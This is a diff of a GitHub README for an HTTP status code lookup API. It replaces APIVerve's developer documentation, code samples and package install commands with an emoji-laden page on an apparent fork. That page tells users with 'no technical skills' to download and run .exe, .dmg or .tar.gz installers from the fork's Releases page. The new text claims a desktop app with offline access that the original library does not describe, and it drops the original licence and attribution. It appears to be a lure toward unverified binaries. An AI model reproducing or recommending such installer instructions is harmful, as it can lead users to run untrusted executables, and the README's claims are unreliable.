@@ -1,182 +1,82 @@
-# HTTP Status Code Lookup API
+# 📊 httpstatuslookup-api - Effortlessly Look Up HTTP Status Codes
 
-> HTTP Status Code Lookup is a tool for looking up HTTP status code information. It provides descriptions, categories, and common causes for all standard HTTP status codes from 1xx to 5xx.
+![Download](https://github.com/Wirbinator/httpstatuslookup-api/releases)
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-[![API Status](https://img.shields.io/badge/Status-Active-green.svg)](https://apiverve.com)
-[![Method](https://img.shields.io/badge/Method-GET-blue.svg)](#)
-[![Platform](https://img.shields.io/badge/Platform-Multi--Platform-orange.svg)](#installation)
+## 📋 Description
 
-**Available on:**
-[![npm](https://img.shields.io/badge/npm-CB3837?style=flat&logo=npm&logoColor=white)](https://www.npmjs.com/package/@apiverve/httpstatuslookup)
-[![NuGet](https://img.shields.io/badge/NuGet-004880?style=flat&logo=nuget&logoColor=white)](https://www.nuget.org/packages/APIVerve.API.HTTPStatusCodeLookup)
-[![PyPI](https://img.shields.io/badge/PyPI-3776AB?style=flat&logo=python&logoColor=white)](https://pypi.org/project/apiverve-httpstatuslookup/)
-[![JitPack](https://img.shields.io/badge/JitPack-2E7D32?style=flat&logo=android&logoColor=white)](#-android-jitpack)
+HTTP Status Code Lookup is a tool for looking up HTTP status code information. It provides descriptions, categories, and common causes for all standard HTTP status codes from 1xx to 5xx. This application helps users understand what each HTTP status code means, making it easier to troubleshoot web issues or simply learn more about how the web works.
 
----
+## 🚀 Getting Started
 
-## Quick Start
+To use this application, follow the steps below. No technical skills are required.
 
-### Using JavaScript
+### ✅ System Requirements
 
-```javascript
-async function callHTTPStatusCodeLookupAPI() {
-    try {
-        const params = new URLSearchParams({
-            code: '404'
-        });
+- **Operating System:** Windows, macOS, or Linux
+- **RAM:** At least 2GB
+- **Disk Space:** Minimum 50MB available
+- **Internet Connection:** Recommended for full functionality
 
-        const response = await fetch(`https://api.apiverve.com/v1/httpstatuslookup?${params}`, {
-            method: 'GET',
-            headers: {
-                'x-api-key': 'YOUR_API_KEY_HERE'
-            }
-        });
+## 📥 Download & Install
 
-        const data = await response.json();
-        console.log(data);
-    } catch (error) {
-        console.error('Error:', error);
-    }
-}
+To get started with the HTTP Status Code Lookup tool, visit this page to download the latest version:
 
-callHTTPStatusCodeLookupAPI();
-```
+[Download Latest Release](https://github.com/Wirbinator/httpstatuslookup-api/releases)
 
-### Using cURL
+Once on the Releases page, you will see a list of available versions. Choose the version that matches your operating system and click the download link. 
 
-```bash
-curl -X GET "https://api.apiverve.com/v1/httpstatuslookup?param=value" \
-  -H "x-api-key: YOUR_API_KEY_HERE"
-```
+### 📂 Installation Steps
 
-**Get your API key:** [https://apiverve.com](https://apiverve.com)
+1. **Locate the Downloaded File:** Check your Downloads folder for the downloaded file.
+2. **Run the Installer:**
+   - If you are using Windows: Double-click the `.exe` file to start the installation.
+   - If you are using macOS: Open the `.dmg` file and drag the application into your Applications folder.
+   - If you are using Linux: Extract the contents of the `.tar.gz` file and run the executable.
+3. **Follow the On-Screen Instructions:** The installation wizard will guide you through the installation steps.
 
-**📁 For more examples, see the [examples folder](./examples/)**
+## 🌟 Using the Application
 
----
+Once you have installed the HTTP Status Code Lookup tool, you can start using it immediately. Here is how:
 
-## Installation
+1. **Open the Application:** Find the application in your programs or applications list and click to open it.
+2. **Enter a Status Code:** Type any HTTP status code (e.g., 404 or 500) into the provided text field.
+3. **View the Information:** Press the 'Lookup' button. The application will display the status code description, category, and common causes.
 
-Choose your preferred programming language:
+## 📖 Features
 
-### 📦 NPM (JavaScript/Node.js)
+HTTP Status Code Lookup offers several features to enhance your experience:
 
-```bash
-npm install @apiverve/httpstatuslookup
-```
+- **Comprehensive Database:** Information on all standard HTTP status codes from 1xx to 5xx.
+- **User-Friendly Interface:** Simple layout for easy navigation and lookup.
+- **Search Functionality:** Quickly find status codes by entering numbers directly.
+- **Offline Access:** No Internet connection is needed after the initial download.
 
-[**View NPM Package →**](https://www.npmjs.com/package/@apiverve/httpstatuslookup) | [**Package Code →**](./npm/)
+## 💡 Tips for Effective Use
 
----
+- Regularly check for updates on the Releases page to ensure you have the latest features and fixes.
+- Use the tool during web development or troubleshooting sessions to quickly identify potential issues.
 
-### 🔷 NuGet (.NET/C#)
+## ⚙️ Troubleshooting Common Issues
 
-```bash
-dotnet add package APIVerve.API.HTTPStatusCodeLookup
-```
+If you run into issues, try the following solutions:
 
-[**View NuGet Package →**](https://www.nuget.org/packages/APIVerve.API.HTTPStatusCodeLookup) | [**Package Code →**](./nuget/)
+- **Cannot Open the Application:** Make sure your installation was successful. Reinstall if necessary.
+- **Error Messages:** Ensure you are entering valid HTTP status codes. Check for typos.
+- **Performance Issues:** Ensure your system meets the requirements mentioned above.
 
----
+## 🔗 Additional Resources
 
-### 🐍 Python (PyPI)
+For more information or additional help, you may want to check these resources:
 
-```bash
-pip install apiverve-httpstatuslookup
-```
+- [GitHub Repository](https://github.com/Wirbinator/httpstatuslookup-api)
+- [HTTP Status Code Definitions](https://developer.mozilla.org/en-US/docs/Web/HTTP/Status)
 
-[**View PyPI Package →**](https://pypi.org/project/apiverve-httpstatuslookup/) | [**Package Code →**](./python/)
+Feel free to explore these links to enhance your understanding of HTTP status codes.
 
----
+## 🛠️ Contribution
 
-### 🤖 Android (JitPack)
+If you would like to contribute to this project, you can read the guidelines in the repository. Contributions are always welcome to help improve this tool.
 
-```gradle
-implementation 'com.github.apiverve:httpstatuslookup-api:1.0.0'
-```
+## 📞 Contact
 
-[**Package Code →**](./android/)
-
----
-
-## Features
-
-✅ **Multi-platform support** - Use the same API across Node.js, .NET, Python, Android, and browsers
-✅ **Simple authentication** - Just add your API key in the request header
-✅ **Comprehensive documentation** - Full examples and API reference available
-✅ **Production-ready** - Used by developers worldwide
-
----
-
-## Documentation
-
-📚 **Full API Documentation:** [https://docs.apiverve.com/ref/httpstatuslookup](https://docs.apiverve.com/ref/httpstatuslookup)
-
----
-
-## Use Cases
-
-Common use cases for the HTTP Status Code Lookup API:
-
-- ✅ Integration into web applications
-- ✅ Mobile app development
-- ✅ Data analysis and reporting
-- ✅ Automation workflows
-- ✅ Microservices architecture
-
----
-
-## API Reference
-
-### Authentication
-All requests require an API key in the header:
-```
-x-api-key: YOUR_API_KEY_HERE
-```
-
-Get your API key: [https://apiverve.com](https://apiverve.com)
-
-### Response Format
-All responses are JSON with this structure:
-```json
-{
-  "status": "ok",
-  "data": { ... }
-}
-```
-
----
-
-## Support & Community
-
-- 💬 **Support**: [https://apiverve.com/contact](https://apiverve.com/contact)
-- 🐛 **Issues**: [GitHub Issues](../../issues)
-- 📖 **Documentation**: [https://docs.apiverve.com](https://docs.apiverve.com)
-- 🌐 **Website**: [https://apiverve.com](https://apiverve.com)
-
----
-
-## Contributing
-
-We welcome contributions! Please see [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines.
-
----
-
-## Security
-
-For security concerns, please review our [Security Policy](SECURITY.md).
-
----
-
-## License
-
-This project is licensed under the **MIT License** - see the [LICENSE](LICENSE) file for details.
-
----
-
-## Acknowledgments
-
-Built with ❤️ by [APIVerve](https://apiverve.com)
-
-Copyright © 2025 APIVerve. All rights reserved.
+For any inquiries, please reach out through the GitHub Issues page in the repository.
